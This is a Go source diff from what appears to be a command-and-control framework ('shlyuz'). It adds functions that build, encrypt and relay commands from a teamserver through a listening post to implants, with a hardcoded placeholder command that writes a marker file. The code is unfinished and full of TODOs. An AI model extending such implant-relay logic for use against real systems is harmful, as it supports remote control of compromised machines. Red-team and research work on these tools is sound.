@@ -3,7 +3,6 @@
 package transaction
 
 import (
-	"bytes"
 	"encoding/json"
 	"errors"
 	"log"
@@ -82,6 +81,21 @@ func rekey(frame routine.EncryptedFrame) {
 
 }
 
+func RouteClientInstruction(client *transport.RegisteredComponent, instruction instructions.InstructionFrame) {
+	var generatedInstruction instructions.InstructionFrame
+
+	switch cmd := instruction.Cmd; cmd {
+	case "icmdr":
+		// RelayCmdRequest(&client, instruction)
+		generatedInstruction = GenerateForwardCmd(client)
+	}
+
+	switch cmd := generatedInstruction.Cmd; cmd {
+	case "rcmda":
+		RelayForwardCmd(client, generatedInstruction)
+	}
+}
+
 func GenerateInitFrame(component component.Component) instructions.InstructionFrame {
 	var initFrame instructions.Transaction
 	var initArgs initFrameArgs
@@ -97,9 +111,10 @@ func GenerateInitFrame(component component.Component) instructions.InstructionFr
 }
 
 func RelayInitFrame(client *transport.RegisteredComponent, initFrame instructions.InstructionFrame) *transport.RegisteredComponent {
+
 	frameMap, _ := json.Marshal(initFrame)
 	transmitFrame, _ := routine.PrepareSealedFrame(frameMap, client.CurPubKey, client.XorKey, client.InitSignature)
-	// shlyuzComponent.CurrentKeypair = frameKeyPair
+	// client.CurKeyPair = frameKeyPair
 	// TODO: We can rotate keys here for ourselves - #? KEYROAT
 	// Generate a new keypair for the LP to use
 	client.CmdChannel = make(chan []byte)
@@ -158,7 +173,7 @@ func RetrieveInitFrame(client *transport.RegisteredComponent) (instructions.Inst
 	// argMapping := implantInitAckArgs{Lpk: client.CurKeyPair.PubKey, Txid: implantInitInstruction.TxId}
 	// argMap, _ := json.Marshal(argMapping)
 	ackInstruction = *instructions.CreateInstructionFrame(ackTransaction, false)
-	ackInstruction.Pk = client.InitalKeyPair.PubKey
+	ackInstruction.Pk = client.CurKeyPair.PubKey
 	// ackInstruction.CmdArgs = string(argMap)
 	return ackInstruction, *client, true
 }
@@ -179,10 +194,10 @@ func RetrieveInstructionRequest(client *transport.RegisteredComponent) (instruct
 
 	// TODO: Send Instruction Frame to command router
 
-	client.CurKeyPair, err = asymmetric.GenerateKeypair()
-	if err != nil {
-		log.Println("failed to generate new keypair")
-	}
+	// client.CurKeyPair, err = asymmetric.GenerateKeypair()
+	// if err != nil {
+	// 	log.Println("failed to generate new keypair")
+	// }
 	// Don't need to use this for instruction requests
 	// var instructionCmdArgs reqCmdArgs
 	// err = json.Unmarshal([]byte(requestInstruction.CmdArgs), &instructionCmdArgs)
@@ -194,15 +209,32 @@ func RetrieveInstructionRequest(client *transport.RegisteredComponent) (instruct
 	return requestInstruction, err
 }
 
-func SendOutput(server transport.RegisteredComponent, event instructions.EventHist) instructions.Transaction {
-	var outputArgs instructions.CmdOutput
-	var OutputTransaction instructions.Transaction
-	OutputTransaction.Cmd = "fcmd"
-	OutputTransaction.ComponentId = server.Id
-	outputArgs.Ipk = server.CurPubKey
-	outputArgs.EventHistory = event
-	rawOutputArgs := new(bytes.Buffer)
-	json.NewEncoder(rawOutputArgs).Encode(outputArgs)
-	OutputTransaction.Arg = rawOutputArgs.Bytes()
-	return OutputTransaction
+func GenerateForwardCmd(client *transport.RegisteredComponent) instructions.InstructionFrame {
+	// func GenerateForwardCmdCmd(server transport.RegisteredComponent, inputArgs instructions.Transaction) instructions.Transaction {
+	// TODO: This is supposed to make a gcmd and send it to the TS, where we will get back a rcmd. We send back an ack to TS with a rcok, while relaying the command with a rcmda
+
+	// TODO: LOGIC TO DECODE THE INSTRUCTION FROM THE TS GOES HERE
+
+	var outputTransaction instructions.Transaction
+	outputTransaction.Cmd = "rcmda"
+	outputTransaction.ComponentId = client.SelfComponentId
+	// TODO: We would already have a txid from the server here, but since that doesn't exist yet, we'll let CreateInstructionFrame generate one
+	// outputTransaction.TxId = receivedTxID
+	// outputTransaction.Arg = receivedArgsFromInputTransaction // we already have this
+	outputTransaction.Arg = []byte(`{"Cmd": "ExecuteFire", "ComponentId": "` + client.Id + `", "args": ["echo ayyyyylmao > ~/shlyuz_was_here"]}`)
+	forwardCmdInstructionFrame := instructions.CreateInstructionFrame(outputTransaction, false)
+	forwardCmdInstructionFrame.Pk = client.CurKeyPair.PubKey
+	return *forwardCmdInstructionFrame
+}
+
+func RelayForwardCmd(client *transport.RegisteredComponent, forwardCmdInstruction instructions.InstructionFrame) {
+	dataFrame, _ := json.Marshal(forwardCmdInstruction)
+	transmitFrame, frameKeyPair := routine.PrepareTransmitFrame(dataFrame, client.CurPubKey, client.CurKeyPair.PrivKey, client.XorKey)
+	client.CurKeyPair = frameKeyPair
+	go writeToChannel(client.CmdChannel, transmitFrame)
+	boolSuccess, err := client.Transport.Send(client.CmdChannel)
+	if !boolSuccess {
+		log.Println("failed to forward command: ", err)
+	}
+	log.Println("Relayed command ", forwardCmdInstruction.TxId, "to ", forwardCmdInstruction.ComponentId)
 }
